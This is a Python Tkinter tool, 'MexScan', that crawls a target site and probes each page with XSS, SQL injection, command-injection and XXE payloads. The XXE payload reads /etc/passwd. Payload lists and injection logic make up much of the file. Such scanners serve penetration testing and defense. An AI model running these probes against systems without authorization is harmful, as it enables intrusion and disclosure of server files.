#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mexscan_gui.py - GUI for Web Vulnerability Scanner (XSS, SQLi, RCE, XXE)
"""

import tkinter as tk
from tkinter import messagebox, scrolledtext
import requests
import urllib.parse
from bs4 import BeautifulSoup
import threading

# Konfigurasi dasar
HEADERS = {"User-Agent": "Mozilla/5.0"}
TIMEOUT = 10
CRAWL_LIMIT = 50

# Payloads
XSS_PAYLOADS = ["<script>alert('xss')</script>", "<img src=x onerror=alert('xss')>"]
SQLI_PAYLOADS = ["' OR 1=1--", "\" OR 1=1--"]
RCE_PAYLOADS = [";id;", ";phpinfo();"]
XXE_PAYLOAD = """<?xml version="1.0"?><!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"""

# Tools logika
def inject_params(url, payload):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    if not query:
        return url
    new_query = {k: [payload] for k in query}
    return parsed._replace(query=urllib.parse.urlencode(new_query, doseq=True)).geturl()

def get_links(url):
    try:
        r = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        return list(set([urllib.parse.urljoin(url, a.get("href")) for a in soup.find_all("a", href=True)]))
    except:
        return []

def scan_vuln(url, text_widget):
    visited = set()
    to_visit = [url]
    results = {"XSS": [], "SQLi": [], "RCE": [], "XXE": []}

    while to_visit and len(visited) < CRAWL_LIMIT:
        current = to_visit.pop(0)
        if current in visited or not current.startswith(url):
            continue
        visited.add(current)
        text_widget.insert(tk.END, f"[Crawling] {current}\n")
        text_widget.update()

        # XSS
        for payload in XSS_PAYLOADS:
            test_url = inject_params(current, payload)
            try:
                r = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
                if payload in r.text:
                    results["XSS"].append(test_url)
                    text_widget.insert(tk.END, f"[+] XSS Found: {test_url}\n")
            except: continue

        # SQLi
        for payload in SQLI_PAYLOADS:
            test_url = inject_params(current, payload)
            try:
                r = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
                if "mysql" in r.text.lower() or "syntax" in r.text.lower():
                    results["SQLi"].append(test_url)
                    text_widget.insert(tk.END, f"[+] SQLi Found: {test_url}\n")
            except: continue

        # RCE
        for payload in RCE_PAYLOADS:
            test_url = inject_params(current, payload)
            try:
                r = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
                if "uid=" in r.text or "phpinfo" in r.text:
                    results["RCE"].append(test_url)
                    text_widget.insert(tk.END, f"[+] RCE Found: {test_url}\n")
            except: continue

        # XXE
        try:
            r = requests.post(current, data=XXE_PAYLOAD, headers={"Content-Type": "application/xml"}, timeout=TIMEOUT, verify=False)
            if "root:x:" in r.text:
                results["XXE"].append(current)
                text_widget.insert(tk.END, f"[+] XXE Found: {current}\n")
        except: pass

        links = get_links(current)
        to_visit += [l for l in links if l not in visited]

    text_widget.insert(tk.END, "\n[Scan Selesai]\n")
    for k, v in results.items():
        text_widget.insert(tk.END, f"{k} ditemukan: {len(v)}\n")
    text_widget.see(tk.END)

# GUI
def start_gui():
    window = tk.Tk()
    window.title("MexScan GUI - Web Vulnerability Scanner")
    window.geometry("820x520")

    tk.Label(window, text="Target URL:").pack(pady=5)
    url_entry = tk.Entry(window, width=90)
    url_entry.pack(pady=5)

    output_box = scrolledtext.ScrolledText(window, width=100, height=25)
    output_box.pack(pady=10)

    def run_scan_thread():
        target = url_entry.get().strip()
        if not target.startswith("http"):
            messagebox.showerror("Invalid URL", "URL harus diawali dengan http:// atau https://")
            return
        output_box.delete(1.0, tk.END)
        threading.Thread(target=scan_vuln, args=(target, output_box), daemon=True).start()

    tk.Button(window, text="Mulai Scan", command=run_scan_thread, bg="green", fg="white", padx=10, pady=5).pack(pady=10)

    window.mainloop()

if __name__ == "__main__":
    start_gui()
